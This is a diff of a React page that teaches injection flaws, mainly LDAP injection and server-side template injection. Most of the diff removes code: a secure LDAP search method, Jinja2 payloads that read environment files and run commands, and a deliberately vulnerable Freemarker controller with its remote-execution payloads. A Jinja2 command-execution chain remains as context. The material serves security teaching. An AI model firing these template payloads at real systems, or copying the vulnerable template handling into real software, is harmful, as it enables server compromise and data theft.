@@ -1,4 +1,3 @@
-
 import React from 'react';
 import { Code, Bug, Database, FileText } from 'lucide-react';
 import CodeExample from '@/components/CodeExample';
@@ -116,7 +115,7 @@ const OtherInjectionFlaws: React.FC = () => {
             </div>
             
             <div className="bg-cybr-muted/20 p-4 rounded-lg">
-              <h6 className="font-semibred text-cybr-primary mb-2">Phase 4: Data Extraction</h6>
+              <h6 className="font-semibold text-cybr-primary mb-2">Phase 4: Data Extraction</h6>
               <ol className="list-decimal pl-6 space-y-1">
                 <li>Use wildcard characters to enumerate all users or groups</li>
                 <li>Extract sensitive attributes like passwords, email addresses</li>
@@ -296,7 +295,7 @@ import java.util.regex.Pattern;
 public class SecureLDAPAuthenticator {
     private DirContext ctx;
     private static final Pattern VALID_USERNAME = Pattern.compile("^[a-zA-Z0-9._-]+$");
-    private static final String[] LDAP_SPECIAL_CHARS = {"*", "(", ")", "\\", "/", "\0"};
+    private static final String[] LDAP_SPECIAL_CHARS = {"*", "(", ")", "\\\\", "/", "\\0"};
     
     public boolean authenticate(String username, String password) {
         // 1. Input validation
@@ -362,51 +361,6 @@ public class SecureLDAPAuthenticator {
         }
     }
     
-    public List<User> searchUsers(String searchTerm) {
-        List<User> users = new ArrayList<>();
-        
-        // 1. Validate and sanitize input
-        if (searchTerm == null || searchTerm.trim().isEmpty()) {
-            return users;
-        }
-        
-        if (searchTerm.length() > 50) { // Reasonable length limit
-            searchTerm = searchTerm.substring(0, 50);
-        }
-        
-        try {
-            // 2. Escape special characters
-            String escapedTerm = escapeLDAPFilter(searchTerm);
-            
-            // 3. Use parameterized query
-            String filter = "(|(cn=*{0}*)(mail=*{0}*))";
-            
-            SearchControls controls = new SearchControls();
-            controls.setSearchScope(SearchControls.SUBTREE_SCOPE);
-            controls.setCountLimit(100); // Reasonable limit
-            controls.setTimeLimit(10000); // 10 second timeout
-            controls.setReturningAttributes(new String[]{"cn", "mail", "department"});
-            
-            NamingEnumeration<SearchResult> results = ctx.search(
-                "ou=users,dc=company,dc=com",
-                filter,
-                new Object[]{escapedTerm},
-                controls
-            );
-            
-            while (results.hasMore()) {
-                SearchResult result = results.next();
-                users.add(createUserFromResult(result));
-            }
-            
-        } catch (NamingException e) {
-            logger.error("User search failed", e);
-        }
-        
-        return users;
-    }
-    
-    // Utility methods for security
     private boolean isValidUsername(String username) {
         return username != null && 
                VALID_USERNAME.matcher(username).matches() && 
@@ -985,120 +939,10 @@ ATTACK PAYLOADS for Jinja2:
 
 5. Advanced RCE Chain:
    /hello?name={{''.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.os.popen('ls -la').read()}}
-   
-6. Environment Variable Access:
-   /hello?name={{''.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.open('/proc/self/environ').read()}}
-
-7. Module Import and Execution:
-   /hello?name={{''.__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('whoami')}}
 '''
 
 if __name__ == '__main__':
     app.run(debug=True)  # Debug mode makes it even more dangerous`} 
-        />
-
-        <CodeExample 
-          language="java" 
-          isVulnerable={true}
-          title="Vulnerable Java Freemarker Implementation" 
-          code={`// Java Spring Boot application vulnerable to SSTI
-import freemarker.template.Configuration;
-import freemarker.template.Template;
-import org.springframework.web.bind.annotation.*;
-import java.io.StringWriter;
-import java.util.HashMap;
-import java.util.Map;
-
-@RestController
-public class TemplateController {
-    
-    private Configuration freemarkerConfig;
-    
-    @GetMapping("/welcome")
-    public String welcome(@RequestParam String username) {
-        try {
-            // Vulnerable: Direct string concatenation in template
-            String templateString = "<html><body><h1>Welcome " + username + "!</h1></body></html>";
-            
-            Template template = new Template("welcome", 
-                new StringReader(templateString), freemarkerConfig);
-            
-            StringWriter writer = new StringWriter();
-            template.process(new HashMap<>(), writer);
-            
-            return writer.toString();
-        } catch (Exception e) {
-            return "Error processing template: " + e.getMessage();
-        }
-    }
-    
-    @PostMapping("/render")
-    public String renderTemplate(@RequestBody Map<String, Object> data) {
-        try {
-            String templateContent = (String) data.get("template");
-            
-            // Vulnerable: User-controlled template content
-            Template template = new Template("dynamic", 
-                new StringReader(templateContent), freemarkerConfig);
-            
-            StringWriter writer = new StringWriter();
-            template.process(data, writer);
-            
-            return writer.toString();
-        } catch (Exception e) {
-            return "Template error: " + e.getMessage();
-        }
-    }
-    
-    @GetMapping("/email")
-    public String emailTemplate(@RequestParam String recipient, 
-                               @RequestParam String subject) {
-        // Vulnerable: Email template with user input
-        String emailTemplate = '''
-            <html>
-            <body>
-                <h2>Email to: ''' + recipient + '''</h2>
-                <h3>Subject: ''' + subject + '''</h3>
-                <p>This is an automated email.</p>
-            </body>
-            </html>
-        ''';
-        
-        try {
-            Template template = new Template("email", 
-                new StringReader(emailTemplate), freemarkerConfig);
-            
-            StringWriter writer = new StringWriter();
-            template.process(new HashMap<>(), writer);
-            
-            return writer.toString();
-        } catch (Exception e) {
-            return "Email template error";
-        }
-    }
-}
-
-/*
-ATTACK PAYLOADS for Freemarker:
-
-1. Basic Expression Evaluation:
-   username=${"freemarker.template.utility.Execute"?new()("whoami")}
-   
-2. File System Access:
-   template=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }
-   
-3. Java System Properties:
-   username=${.now}${System.getProperty("java.version")}
-   
-4. Class Loading and Execution:
-   POST /render
-   {
-     "template": "<#assign classLoader=object?api.class.protectionDomain.classLoader> <#assign clazz=classLoader.loadClass(\"java.lang.Runtime\")> <#assign obj=clazz.getMethod(\"getRuntime\",null).invoke(null,null)> <#assign result=obj.getMethod(\"exec\",classLoader.loadClass(\"java.lang.String\")).invoke(obj,\"whoami\")> ${result}"
-   }
-
-5. Execute System Commands:
-   recipient=${"freemarker.template.utility.Execute"?new()("ls -la")}
-*/`} 
         />
 
         <CodeExample 
@@ -1285,7 +1129,7 @@ if __name__ == '__main__':
             <div>
               <h6 className="font-semibold mb-2">Manual Testing Approach</h6>
               <ol className="list-decimal pl-6 space-y-2">
-                <li><strong>Template Expression Testing:</strong> Try basic expressions like {`{{7*7}}`} or {`${7*7}`}</li>
+                <li><strong>Template Expression Testing:</strong> Try basic expressions like {`{{7*7}}`} or ${`{7*7}`}</li>
                 <li><strong>Template Syntax Detection:</strong> Test different template syntaxes to identify the engine</li>
                 <li><strong>Error Message Analysis:</strong> Trigger template errors to reveal engine information</li>
                 <li><strong>Configuration Access:</strong> Try to access application configuration through templates</li>
